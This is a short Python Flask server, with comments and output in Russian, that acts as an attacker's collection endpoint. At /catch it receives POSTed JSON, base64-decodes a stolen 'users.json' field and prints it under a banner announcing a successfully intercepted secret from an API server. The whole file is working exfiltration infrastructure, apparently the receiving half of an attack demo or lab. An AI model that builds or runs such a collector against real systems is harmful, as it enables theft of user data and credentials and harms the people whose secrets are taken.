from flask import Flask, request, jsonify
import base64
import json

app = Flask(__name__)

@app.route('/catch', methods=['POST'])
def catch_secret():
    try:

        secret_data = request.get_json()
        

        encoded_users = secret_data['data']['users.json']
        

        decoded_users = base64.b64decode(encoded_users).decode('utf-8')
        
        print("\n[!!!] УСПЕШНО ПЕРЕХВАЧЕН СЕКРЕТ ИЗ API-СЕРВЕРА:")
        print(decoded_users)
        print("-" * 40)
        
        return jsonify({"status": "received"}), 200
    except Exception as e:
        print(f"Ошибка при обработке данных: {e}")
        return jsonify({"status": "error"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)